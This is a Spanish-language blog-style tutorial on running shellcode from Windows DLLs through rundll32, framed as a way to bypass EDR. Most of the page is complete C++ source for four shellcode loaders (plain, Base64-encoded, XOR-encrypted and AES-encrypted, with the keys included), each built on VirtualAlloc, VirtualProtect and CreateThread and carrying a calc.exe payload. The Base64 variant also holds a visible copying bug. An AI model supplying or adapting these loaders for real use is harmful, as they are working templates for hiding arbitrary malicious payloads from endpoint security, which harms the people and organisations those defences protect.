---
layout: default
---

# Indice

1. [Binarios exe Vs librerías dinámicas dll](#binarios-exe-vs-librerías-dinámicas-dll)
2. [DLL Inyección de código](#dll-inyeccion-de-codigo)
3. [DLL calc shellcode section text](#dll-calc-shellcode-section-text)
4. [DLL calc shellcode Base64 codificado](#dll-calc-shellcode-base64-codificado)
5. [DLL calc shellcode Encriptacion XOR](#dll-calc-shellcode-encriptacion-xor)
6. [DLL calc shellcode Encriptacion AES](#dll-calc-shellcode-encriptacion-aes)

# Binarios exe Vs librerías dinámicas dll

Estos dos tipos de ficheros, tienen diferencias a tres nieveles :

- Sistema operativo: tipo de fichero
- Código fuente: estructúra de código
- Ejecución: auto ejecutable vs depende de la ejecución mediante un binario

## Binario .exe

Por definición un fichero exe, dentro del sistema operativo tiene la posibilidad de ejecutarse por si mismo, crear un proceso que cobrará vida propia y realizará las operaciones que se han desarrollado en el código fuente.
Es por este motivo que los EDR, muestran especial interes en las librerías que cargan y operaciones que realizan en tiempo de ejecución, si están firmadas o no por alguien de confianza. etc.

A nivel código fuente será relevante diferenciarlo por su estructura de una dll
Como ejemplo, todo el código funete de las seccionies:
[Droppers_codigo](./Dropperscodigo.html)
[Obfuscacion_encriptacion](./Obfuscacion_encriptacion.html)

## Librería dll

Las librerías dinámicas son cargadas en tiempo de ejecución por los binerios .exe, estas pueden ser del propio sistema operativo para interacturar con sus funcionalidades, memoria, kernel, etc. O desarrolladas, como será el caso.

Un punto interesante es que las librerías dinámicas o Dlls tambien son ejecutables por si mismas dentro del sistema operativo, por binarios como rundll32.exe
Y los EDRs tienen le dan una menor relevancia, al código que estas contienen por lo que siempre será mas facil reliar el bypass de un EDR con este tipo de binarios/ejecutables.

La estructura de su código es diferente, luciendo el caso base del siguiente modo:

```c++

#include <Windows.h>
#pragma comment (lib, "user32.lib")


extern "C" {
__declspec(dllexport) BOOL WINAPI f0ns1(void) {
	
	MessageBox(
		NULL,
		"Dll Execution example ",
		"f0ns1",
        MB_OK
	);
	 
		 return TRUE;
	}
}
BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpReserved) {

    switch (ul_reason_for_call)  {
    case DLL_PROCESS_ATTACH:
		break;
    case DLL_THREAD_ATTACH:
		break;
    case DLL_THREAD_DETACH:
		break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

```

La dll exporta una única función con nombre f0ns1, es posible revisarlo con la herramienta dumpin:

```
dumpbin /EXPORTS f0ns1_exec.dll
Microsoft (R) COFF/PE Dumper Version 14.27.29112.0
Copyright (C) Microsoft Corporation.  All rights reserved.


Dump of file f0ns1_exec.dll

File Type: DLL

  Section contains the following exports for f0ns1_exec.dll

    00000000 characteristics
    FFFFFFFF time date stamp
        0.00 version
           1 ordinal base
           1 number of functions
           1 number of names

    ordinal hint RVA      name

          1    0 00001000 f0ns1

  Summary

        2000 .data
        1000 .pdata
        9000 .rdata
        1000 .reloc
        B000 .text
        1000 _RDATA

```
La ejecución de la Dll mediante el binario rundll32:

```
rundll32.exe f0ns1_exec.dll,f0ns1

```

Evidencia de la ejecución:

![basedll](/assets/images/basedll.png)


# DLL Inyección de código

## DLL calc shellcode section text

El código asociado a la inyección de la calculadora:
```c
#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#pragma comment (lib, "user32.lib")


extern "C" {
__declspec(dllexport) BOOL WINAPI f0ns1(void) {
	
	void * exec_mem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;

	unsigned char payload[] = {
  0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51,
  0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52,
  0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72,
  0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
  0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
  0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b,
  0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
  0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44,
  0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41,
  0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
  0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1,
  0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
  0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44,
  0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01,
  0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
  0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
  0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48,
  0xba, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d,
  0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5,
  0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
  0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0,
  0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89,
  0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00
	};
	unsigned int payload_len = 276;
	
	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	printf("\nSotred payload in .text section: %-20s : 0x%-016p\n", "payload addr", (void *)payload);
	printf("\n [VirtualAlloc] of new moemory region: %-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_mem);
	printf("\n [RtlMoveMemory] copy data \n");
	RtlMoveMemory(exec_mem, payload, payload_len);
	printf("\n [VirtualProtect] Include execution and read privileges PAGE_EXECUTE_READ \n");
	rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);
	printf("\n [CreateThread] Exec stored payload \n");
	if ( rv != 0 ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, -1);
	}
	return TRUE;
	}
}
BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpReserved) {

    switch (ul_reason_for_call)  {
    case DLL_PROCESS_ATTACH:
		break;
    case DLL_THREAD_ATTACH:
		break;
    case DLL_THREAD_DETACH:
		break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

```
La ejecución del proceso: 

```
rundll32.exe base_injection_exec.dll,f0ns1
```

![base_injection_exec_dll](/assets/images/base_injection_exec_dll.png)

## DLL calc shellcode Base64 codificado

El código asociado a la inyección de la calculadora obfuscada en Base64:
```c
#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <Wincrypt.h>
#pragma comment (lib, "user32.lib")
#pragma comment (lib, "Crypt32.lib")

extern "C" {

int DecodeBase64( const BYTE * src, unsigned int srcLen, char * dst, unsigned int dstLen ) {
	DWORD outLen;
	BOOL fRet;
	outLen = dstLen;
	fRet = CryptStringToBinary( (LPCSTR) src, srcLen, CRYPT_STRING_BASE64, (BYTE * )dst, &outLen, NULL, NULL);
	if (!fRet) outLen = 0;  // failed
	return( outLen );
	}
	
__declspec(dllexport) BOOL WINAPI f0ns1(void) {	
	unsigned char calc_payload[] = "/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//Vu/C1olZBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/VY2FsYy5leGUA";
	unsigned int payload_len = sizeof(calc_payload);
	void * exec_mem;
	DWORD outLenb64;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;
	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	DecodeBase64((const BYTE *)calc_payload, payload_len, (char *) exec_mem, payload_len);
	RtlMoveMemory(exec_mem, calc_payload, payload_len);
	rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);
	if ( rv != 0 ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, -1);
	}
	return 0;
	}
}

BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpReserved) {

    switch (ul_reason_for_call)  {
    case DLL_PROCESS_ATTACH:
		break;
    case DLL_THREAD_ATTACH:
		break;
    case DLL_THREAD_DETACH:
		break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```
La ejecución del proceso: 

```
rundll32.exe base_injection_exec.dll,f0ns1
```

## DLL calc shellcode Encriptacion XOR

```c
#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#pragma comment (lib, "user32.lib")

extern "C" {


void XOR(char * data, size_t data_len, char * key, size_t key_len) {
	int j;
	
	j = 0;
	for (int i = 0; i < data_len; i++) {
		if (j == key_len - 1) j = 0;

		data[i] = data[i] ^ key[j];
		j++;
	}
}
	
__declspec(dllexport) BOOL WINAPI f0ns1(void) {	
	void * exec_mem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;

	unsigned char calc_payload[] = { 0x85, 0x17, 0xdc, 0x89, 0x9f, 0x8c, 0xa1, 0x62, 0x61, 0x21, 0x60, 0x70, 0x38, 0xf, 0xd, 0x3c, 0x39, 0x2c, 0x50, 0xb0, 0x4, 0x69, 0xaa, 0x73, 0x19, 0x17, 0xd4, 0x3f, 0x77, 0x2c, 0xea, 0x30, 0x41, 0x69, 0xaa, 0x53, 0x29, 0x17, 0x50, 0xda, 0x25, 0x2e, 0x2c, 0x53, 0xa8, 0x69, 0x10, 0xe1, 0xd5, 0x63, 0x3e, 0x11, 0x6d, 0x48, 0x41, 0x23, 0xa0, 0xe8, 0x2c, 0x60, 0x78, 0x9e, 0xbd, 0x80, 0x3d, 0x25, 0x30, 0x2a, 0xea, 0x73, 0x1, 0xaa, 0x3b, 0x63, 0x17, 0x6c, 0xbf, 0xef, 0xe1, 0xea, 0x61, 0x21, 0x21, 0x69, 0xfc, 0x9f, 0x2b, 0xa, 0x27, 0x65, 0xb1, 0x32, 0xea, 0x69, 0x39, 0x65, 0xf2, 0x1f, 0x7f, 0x24, 0x6e, 0xb4, 0x82, 0x34, 0x29, 0xde, 0xe8, 0x60, 0xf2, 0x6b, 0xd7, 0x25, 0x6e, 0xb2, 0x2c, 0x53, 0xa8, 0x69, 0x10, 0xe1, 0xd5, 0x1e, 0x9e, 0xa4, 0x62, 0x25, 0x60, 0xa3, 0x59, 0xc1, 0x54, 0xd0, 0x35, 0x5c, 0x13, 0x49, 0x67, 0x21, 0x58, 0xb3, 0x14, 0xf9, 0x79, 0x65, 0xf2, 0x1f, 0x7b, 0x24, 0x6e, 0xb4, 0x7, 0x23, 0xea, 0x2d, 0x69, 0x65, 0xf2, 0x1f, 0x43, 0x24, 0x6e, 0xb4, 0x20, 0xe9, 0x65, 0xa9, 0x69, 0x20, 0xa9, 0x1e, 0x7, 0x2c, 0x37, 0x3a, 0x38, 0x38, 0x20, 0x79, 0x60, 0x78, 0x38, 0x5, 0x17, 0xee, 0x83, 0x44, 0x20, 0x30, 0x9e, 0xc1, 0x79, 0x60, 0x20, 0x5, 0x17, 0xe6, 0x7d, 0x8d, 0x36, 0x9d, 0x9e, 0xde, 0x7c, 0x69, 0xc3, 0x5e, 0x5f, 0x6d, 0x6f, 0x64, 0x61, 0x62, 0x61, 0x69, 0xac, 0xac, 0x78, 0x5e, 0x5f, 0x6d, 0x2e, 0xde, 0x50, 0xe9, 0xe, 0xa6, 0xde, 0xf4, 0xc2, 0xaf, 0xea, 0xcf, 0x39, 0x25, 0xdb, 0xc4, 0xf4, 0x9c, 0xbc, 0xde, 0xac, 0x17, 0xdc, 0xa9, 0x47, 0x58, 0x67, 0x1e, 0x6b, 0xa1, 0xda, 0xc1, 0xc, 0x5a, 0xe4, 0x2a, 0x7c, 0x16, 0xe, 0x8, 0x61, 0x78, 0x60, 0xa8, 0xa3, 0xa0, 0x8a, 0xe, 0xe, 0x8, 0x2, 0x4c, 0x4, 0x59, 0x44, 0x21 };
	unsigned int payload_len = sizeof(calc_payload);
	char key[] = "y__modaba!!!";
	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	XOR((char *) calc_payload, payload_len, key, sizeof(key));
	RtlMoveMemory(exec_mem, calc_payload, payload_len);
	rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);
	if ( rv != 0 ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, -1);
	}
	return 0;
	}
}

BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpReserved) {

    switch (ul_reason_for_call)  {
    case DLL_PROCESS_ATTACH:
		break;
    case DLL_THREAD_ATTACH:
		break;
    case DLL_THREAD_DETACH:
		break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```
La ejecución del proceso: 

```
rundll32.exe base_injection_exec.dll,f0ns1
```
![xor_dll_encription](/assets/images/xor_dll_encryption.png)

## DLL calc shellcode Encriptacion AES

```c
#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#include <psapi.h>
#pragma comment (lib, "user32.lib")
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")


extern "C" {

int AESDecrypt(byte * payload, unsigned int payload_len, char * key, size_t keylen) {
        HCRYPTPROV hProv;
        HCRYPTHASH hHash;
        HCRYPTKEY hKey;
		DWORD * pointer_len = (DWORD *)&payload_len; 
        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
                return -1;
        }
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
                return -1;
        }
        if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
                return -1;              
        }
        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
                return -1;
        }
        if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, payload, pointer_len)){
                return -1;
        }
        CryptReleaseContext(hProv, 0);
        CryptDestroyHash(hHash);
        CryptDestroyKey(hKey);  
        return 0;
}
	
__declspec(dllexport) BOOL WINAPI f0ns1(void) {	
	void * exec_mem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;
	unsigned char calc_payload[] = { 0x3f, 0x9d, 0x4, 0x52, 0x9c, 0x99, 0x8e, 0x50, 0x35, 0x14, 0xd, 0xa8, 0x8e, 0xf9, 0x74, 0x85, 0x16, 0xc5, 0x6c, 0xf7, 0xb3, 0xd0, 0x3f, 0x72, 0x4e, 0xfa, 0x7d, 0x3b, 0xe4, 0x39, 0xc5, 0xcb, 0x7c, 0xdf, 0xb2, 0xa0, 0xd2, 0xac, 0xca, 0x63, 0x2e, 0x31, 0xb, 0xf4, 0x1b, 0xfb, 0x10, 0xba, 0x2b, 0x7d, 0x47, 0x46, 0xce, 0x79, 0x7c, 0x79, 0x19, 0x4c, 0x9a, 0xca, 0x2f, 0xf3, 0x1e, 0x50, 0x28, 0x63, 0x65, 0x4e, 0x84, 0x8e, 0x43, 0x62, 0xcc, 0xc6, 0xb3, 0x5, 0x8b, 0x12, 0x9e, 0xc8, 0x33, 0x55, 0xe8, 0xe2, 0x5e, 0xe, 0x8d, 0x6f, 0xb3, 0xa8, 0x87, 0x11, 0xcb, 0xc8, 0x68, 0x86, 0x56, 0x94, 0xfd, 0xb2, 0x9a, 0x84, 0x42, 0x6e, 0xd5, 0x38, 0x0, 0x63, 0xd1, 0xbe, 0x80, 0xa, 0xe6, 0xc0, 0xf8, 0x22, 0x63, 0xb6, 0x85, 0x85, 0xe3, 0x8, 0xe3, 0xac, 0x1e, 0xa3, 0x1, 0x39, 0xca, 0x71, 0xd3, 0xd8, 0x8d, 0x83, 0x8f, 0xa4, 0x5b, 0x1b, 0x3e, 0xc6, 0x86, 0x6f, 0xb9, 0xd9, 0x5d, 0x29, 0x4b, 0x16, 0x7d, 0xbf, 0x2e, 0xa2, 0x1d, 0x6f, 0x5e, 0xf6, 0x62, 0x54, 0x22, 0x87, 0x4, 0x8a, 0xd6, 0x1c, 0xff, 0x42, 0xf4, 0x3c, 0xa3, 0xfc, 0x50, 0x7d, 0x1c, 0xa3, 0xc3, 0xe, 0xdc, 0x1a, 0x7d, 0x1f, 0x9c, 0x41, 0xd4, 0xa7, 0x31, 0x5e, 0x7d, 0x37, 0x2f, 0x6f, 0xec, 0x71, 0x9a, 0x24, 0xe6, 0x8e, 0x2c, 0x71, 0x6f, 0x4f, 0x4b, 0x19, 0xf1, 0xbb, 0x66, 0xbd, 0x6d, 0xbd, 0x16, 0x70, 0x8a, 0x8b, 0x29, 0x56, 0xbd, 0xe6, 0x6a, 0x46, 0xf9, 0x60, 0x8a, 0xa1, 0x5b, 0x81, 0x1c, 0x2, 0x53, 0xb3, 0xdf, 0x2b, 0xcc, 0xae, 0x4d, 0x7a, 0xf7, 0x0, 0xa, 0x47, 0xbb, 0x33, 0xdf, 0x1f, 0x32, 0xba, 0x25, 0xf7, 0x58, 0x5, 0x9e, 0xc5, 0xe4, 0x4e, 0xdf, 0x57, 0xd1, 0x69, 0xa9, 0x96, 0x50, 0xbf, 0xde, 0x3d, 0x26, 0xe0, 0x6, 0xe0, 0x46, 0x25, 0x23, 0x40, 0x7e, 0xe2, 0xa2, 0x3c, 0x2a, 0x92, 0xe5, 0x95, 0xff, 0x81, 0x7c, 0x42, 0x61, 0x3, 0xac, 0xdc, 0x91, 0x8f };
	unsigned int payload_len = sizeof(calc_payload);
	char key[] = { 0x95, 0x21, 0x49, 0x58, 0x98, 0xe8, 0x50, 0xef, 0x36, 0x29, 0x22, 0x93, 0x9e, 0xce, 0x25, 0xc3 };
	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	AESDecrypt((byte *) calc_payload, payload_len, key, sizeof(key));
	RtlMoveMemory(exec_mem, calc_payload, payload_len);
	rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);
	if ( rv != 0 ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, -1);
	}
	return 0;
}
}

BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpReserved) {

    switch (ul_reason_for_call)  {
    case DLL_PROCESS_ATTACH:
		break;
    case DLL_THREAD_ATTACH:
		break;
    case DLL_THREAD_DETACH:
		break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```
La ejecución del proceso: 

```
rundll32.exe base_injection_exec.dll,f0ns1
```
![xor_dll_encription](/assets/images/aes_dll_encryption.png)


[back](./)